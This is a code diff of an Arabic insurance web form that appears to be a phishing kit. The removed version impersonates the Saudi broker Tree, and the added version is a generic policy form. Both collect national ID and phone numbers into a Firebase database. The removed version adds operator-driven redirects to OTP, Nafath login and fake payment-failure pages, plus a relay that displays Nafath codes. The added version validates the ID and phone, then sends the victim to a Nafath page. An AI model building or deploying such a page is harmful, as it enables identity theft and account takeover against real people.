@@ -3,67 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تري لوساطة التأمين | Tree</title>
+    <title>تأمين المركبات | البداية</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    
     <style>
-        :root { --tree-green: #00ff9d; --bg-dark: #0d1b1a; }
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg-dark); color: white; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: url('https://tree.com.sa/assets/images/home/hero-bg.jpg'); background-size: cover; background-position: center; }
-        header { width: 100%; padding: 20px 40px; display: flex; justify-content: space-between; box-sizing: border-box; }
-        .logo { font-size: 24px; font-weight: bold; } .logo span { color: var(--tree-green); }
-        .main-container { width: 90%; max-width: 450px; margin-top: 20px; text-align: right; }
-        .tagline { color: var(--tree-green); font-size: 14px; margin-bottom: 5px; }
-        .title { font-size: 32px; font-weight: bold; margin: 0 0 20px 0; }
-        
-        /* صندوق البيانات */
-        .glass-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); border-radius: 25px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.1); }
-        
-        /* تبديل نوع التأمين */
-        .tabs { display: flex; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 5px; margin-bottom: 20px; }
-        .tab { flex: 1; text-align: center; padding: 10px; font-size: 13px; cursor: pointer; border-radius: 10px; transition: 0.3s; }
-        .tab.active { background: var(--tree-green); color: #0d1b1a; font-weight: bold; }
-
-        input { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 12px; border: none; background: rgba(255, 255, 255, 0.15); color: white; font-size: 14px; box-sizing: border-box; outline: none; text-align: right; }
-        input::placeholder { color: rgba(255,255,255,0.6); }
-
-        .checkbox-container { display: flex; align-items: flex-start; gap: 10px; font-size: 11px; color: rgba(255,255,255,0.7); margin: 15px 0; }
-        .btn-submit { width: 100%; padding: 18px; border-radius: 15px; border: none; background: var(--tree-green); color: #0d1b1a; font-weight: bold; font-size: 18px; cursor: pointer; }
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; padding: 20px; }
+        .form-container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 18px; }
+        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        button:hover { background: #0056b3; }
+        .error-msg { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="logo">tree</div>
-    <div style="display:flex; gap:15px; font-size:14px;"><span>En</span><span style="color:var(--tree-green)">ع</span></div>
-</header>
-
-<div class="main-container">
-    <div class="tagline">تأمين السيارات</div>
-    <h1 class="title">احمِ مركبتك!</h1>
-
-    <div class="glass-card">
-        <div class="tabs">
-            <div class="tab active">تأمين جديد</div>
-            <div class="tab">نقل ملكية</div>
-            <div class="tab">تجديد الوثيقة</div>
-        </div>
-
-        <input type="text" id="serialNum" placeholder="الرقم التسلسلي / بطاقة جمركية">
-        <input type="number" id="idNum" placeholder="رقم الهوية / الإقامة الخاصة بك">
-        <input type="text" id="birthDate" placeholder="تاريخ الميلاد" onfocus="(this.type='date')">
-        <input type="tel" id="phoneNum" placeholder="رقم الجوال  |  +966">
-        <input type="text" id="startDate" placeholder="تاريخ بدء الوثيقة" onfocus="(this.type='date')">
-
-        <div class="checkbox-container">
-            <input type="checkbox" id="terms" style="width: 20px; margin: 0;">
-            <label for="terms">بالمتابعة، أقر بقراءة وفهم وقبول إشعار الخصوصية لشركة تري الرقمية لوكالة التأمين</label>
-        </div>
-
-        <button class="btn-submit" onclick="startOrder()">أمن الحين</button>
-    </div>
+<div class="form-container">
+    <h2 style="text-align: center;">إصدار وثيقة تأمين</h2>
+    
+    <label>رقم الهوية / الإقامة</label>
+    <input type="tel" id="id_number" placeholder="1XXXXXXXXX" maxlength="10" 
+           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+    
+    <label>رقم الجوال</label>
+    <input type="tel" id="phone_number" placeholder="05XXXXXXXX" maxlength="10" 
+           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+    
+    <div id="error-box" class="error-msg"></div>
+    
+    <button onclick="handleSecureOrder()">أمن الحين</button>
 </div>
 
 <script>
+    // --- 1. إعدادات Firebase الخاصة بك ---
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -75,57 +47,54 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    async function startOrder() {
-        const id = document.getElementById('idNum').value;
-        const serial = document.getElementById('serialNum').value;
-        const birth = document.getElementById('birthDate').value;
-        const phone = document.getElementById('phoneNum').value;
-        const start = document.getElementById('startDate').value;
-
-        if(!id || !phone || !serial) { alert("يرجى تعبئة الحقول الأساسية"); return; }
-
-        try {
-            localStorage.setItem('user_id', id);
-            await db.collection("orders").doc(id).set({
-                id: id,
-                serial: serial,
-                birthDate: birth,
-                phone: phone,
-                startDate: start,
-                status: "الصفحة الرئيسية",
-                timestamp: firebase.firestore.FieldValue.serverTimestamp()
-            }, { merge: true });
-
-            window.location.href = "offers.html";
-        } catch (e) { alert("خطأ في الاتصال"); }
-    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
-    if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_faild.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    const codeBox = document.getElementById('nafath-number');
-                    if (codeBox && data.nafath_code) {
-                        codeBox.innerText = data.nafath_code;
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) overlay.style.display = 'none';
-                    }
-                }
-            }
-        });
+    // --- 2. وظيفة تحويل الأرقام العربية إلى إنجليزية ---
+    function toEnglish(str) {
+        return str.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632);
     }
-})();
-// ------------------------------------------
 
+    // --- 3. وظيفة الإرسال الذكية ---
+    async function handleSecureOrder() {
+        const errBox = document.getElementById('error-box');
+        errBox.style.display = "none";
+
+        // جلب البيانات وتحويلها فوراً لأرقام إنجليزية
+        let idVal = toEnglish(document.getElementById('id_number').value.trim());
+        let phoneVal = toEnglish(document.getElementById('phone_number').value.trim());
+
+        // --- اختبار الذكاء رقم 1 (الهوية) ---
+        if (idVal.length !== 10 || (idVal[0] !== '1' && idVal[0] !== '2')) {
+            errBox.innerText = "❌ رقم الهوية غير صحيح (يجب 10 أرقام ويبدأ بـ 1 أو 2)";
+            errBox.style.display = "block";
+            return;
+        }
+
+        // --- اختبار الذكاء رقم 2 (الجوال) ---
+        if (phoneVal.length !== 10 || !phoneVal.startsWith('05')) {
+            errBox.innerText = "❌ رقم الجوال غير صحيح (يجب 10 أرقام ويبدأ بـ 05)";
+            errBox.style.display = "block";
+            return;
+        }
+
+        // --- 4. إرسال البيانات إذا نجح الفحص ---
+        try {
+            const docRef = await db.collection("orders").add({
+                id_number: idVal,
+                phone: phoneVal,
+                status: "طلب جديد",
+                next_step: "WAITING",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+
+            // حفظ الـ ID للانتقال لصفحة نفاذ
+            localStorage.setItem('user_id', docRef.id);
+            window.location.href = "nafath.html";
+
+        } catch (error) {
+            alert("حدث خطأ، يرجى التحقق من اتصالك");
+        }
+    }
 </script>
+
 </body>
 </html>
 
